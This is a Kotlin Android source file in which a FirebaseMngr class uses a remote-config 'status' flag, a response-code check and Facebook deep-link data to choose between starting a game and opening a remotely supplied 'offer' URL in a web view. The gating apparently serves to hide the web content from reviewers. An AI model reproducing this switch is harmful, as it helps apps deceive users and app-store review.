package io.lib.fb.heads

import android.app.Activity
import android.util.Log
import io.lib.fb.Constants.TAG
import io.lib.fb.interfaces.RemoteMngrCallback
import io.lib.fb.Tools
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import android.os.StrictMode
import android.os.StrictMode.ThreadPolicy
import com.facebook.applinks.AppLinkData
import io.lib.fb.AppsProjector
import io.lib.fb.AppsProjector.preferences
import io.lib.fb.Constants.ONCONVERSION
import io.lib.fb.Constants.ONDEEPLINK
import io.lib.fb.chest.persistroom.model.Link
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch


class FirebaseMngr(private val activity: Activity) {



    private lateinit var remoteMngrCallback: RemoteMngrCallback

    fun getDeepLink(){

        Tools.getAdId(activity)

        when (preferences.getOnDeepLinkDataSuccess(ONDEEPLINK)) {
            "null" -> {

                AppLinkData.fetchDeferredAppLinkData(activity) {
                    when (it) {
                        null -> {
                            preferences.setOnDeepLinkDataSuccess(ONDEEPLINK, "false")
                            fetchMainCycle()
                        }

                        else -> {
                            Log.d("testing", it.targetUri.toString())
                            preferences.setOnDeepLinkDataSuccess(ONDEEPLINK, "true")
                            remoteMngrCallback.onDeepLinkSuccess(Firebase.remoteConfig.getString("fbappid"), Firebase.remoteConfig.getString("fbappsecret"), Firebase.remoteConfig.getString("offer"), it.targetUri.toString())
                        }
                    }
                }

            }

            "true" -> {
                createBase()
            }

            "false" -> {
                fetchMainCycle()
            }


        }



    }

    fun initialize() {

        val policy = ThreadPolicy.Builder().permitAll().build()

        StrictMode.setThreadPolicy(policy)


        remoteMngrCallback = activity as RemoteMngrCallback

        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }


        Firebase.remoteConfig.setConfigSettingsAsync(configSettings)

        Firebase.remoteConfig.fetchAndActivate().addOnCompleteListener(activity) { task ->


            if (task.isSuccessful) {

                Log.d(TAG, "status - " + Firebase.remoteConfig.getString("status"))
                Log.d(TAG, "check - " + Firebase.remoteConfig.getString("check"))
                Log.d(TAG, "link - " + Firebase.remoteConfig.getString("offer"))


                when (Firebase.remoteConfig.getString("status")) {
                    "false" -> {
                        remoteMngrCallback.onStatusFalse()
                    }

                    "true" -> {
                        remoteMngrCallback.onStatusTrue()

                        when (Tools.getResponseCode(Firebase.remoteConfig.getString("check"))) {

                            200 -> {

                                //  Constants.part1 = Firebase.remoteConfig.getString("offer")
                                Log.d(TAG, "response code 200")
                                getDeepLink()

                            }

                            404 -> {
                                remoteMngrCallback.onFalseCode(404)
                                Log.d(TAG, "response code 400")
                                // startGame()

                            }

                            0 -> {

                                remoteMngrCallback.onFalseCode(0)
                                Log.d(TAG, "response code 0")
                                //  Toast.makeText(this, "No Ethernet!", Toast.LENGTH_SHORT).show()
                                //  startGame()
                            }
                        }

                    }

                }
            } else {

            }

        }

    }


    fun fetchMainCycle(){

        when (preferences.getOnConversionDataSuccess(ONCONVERSION)) {
            "null" -> {
                Log.d(TAG, "null - OnConversion")
                remoteMngrCallback.onSuccessCode(Firebase.remoteConfig.getString("offer"))

            }

            "true" -> {
                createBase()
            }

        }
    }


    fun createBase(){
        GlobalScope.launch(Dispatchers.IO) {
            var list = AppsProjector.createRepoInstance(activity).getAllData()

            Log.d(TAG, "$list main list")
            if(list.contains(Link(1, "false"))){
                Log.d(TAG, "exist 2 element" + " starting game")

            } else if(list.isEmpty()) {
                Log.d(TAG, "exist 2 element" + " starting game")

            } else {
                Log.d(TAG, "exist 1 element" + " starting web")
                Log.d(TAG, list[0].link.toString())
                // Reobject.ASWV_URL = list[0].link.toString()
                remoteMngrCallback.nonFirstLaunch(list[0].link.toString())

            }

        }
    }
}